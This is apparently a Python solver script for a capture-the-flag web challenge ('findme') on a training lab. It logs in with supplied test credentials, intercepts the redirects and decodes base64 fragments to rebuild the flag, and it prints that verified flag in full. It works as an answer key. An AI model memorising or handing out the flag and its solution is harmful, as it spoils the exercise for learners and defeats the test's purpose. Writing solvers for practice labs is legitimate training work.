#!/usr/bin/env python3
"""Solver for Challenge 349 findme (picoCTF 2023, Web Exploitation).

Express login form (`action=/login method=post`). POST username=test &
password=test! -> 302 to /next-page/id=<b64#1>. That page JS-redirects to
/next-page/id=<b64#2>, then to /home. The two base64 segments concatenate
into the flag: 'academy{proxies_al' + 'l_the_way_661fc398}'.

Lab is on-demand (PUT /api/challenges/349/instance/); host:port rotates.
Usage: solve_349_findme.py [base-url]
Verified: academy{proxies_all_the_way_661fc398} (POST /api/submissions/ -> correct:true)
"""
import base64
import re
import sys
import urllib.error
import urllib.request

BASE = "http://xebec.cylabacademy.net:33456"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36")
EXPECTED = "academy{proxies_all_the_way_661fc398}"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def fetch(url: str, data: bytes | None = None) -> tuple[int, str, str]:
    opener = urllib.request.build_opener(NoRedirect)
    req = urllib.request.Request(url, data=data, headers={"User-Agent": UA})
    try:
        with opener.open(req, timeout=30) as r:
            return r.status, r.read().decode(), ""
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(), e.headers.get("Location", "")


def solve(base: str = BASE) -> str:
    base = base.rstrip("/")
    st, _, loc = fetch(base + "/login",
                       b"username=test&password=test!")
    assert st == 302 and loc, "login did not redirect: %s" % st
    if loc.startswith("/"):
        loc = base + loc
    parts = []
    m0 = re.search(r"/next-page/id=([A-Za-z0-9+/=]+)", loc)
    if m0:
        parts.append(base64.b64decode(m0.group(1)).decode())
    url = loc
    for _ in range(5):
        st, body, _ = fetch(url)
        m = re.search(r"/next-page/id=([A-Za-z0-9+/=]+)", body)
        if not m:
            break
        seg = base64.b64decode(m.group(1)).decode()
        parts.append(seg)
        url = base + m.group(0)
    flag = "".join(parts)
    print("segments:", parts)
    print("flag:", flag)
    assert flag == EXPECTED, flag
    return EXPECTED


if __name__ == "__main__":
    print(solve(sys.argv[1] if len(sys.argv) > 1 else BASE))
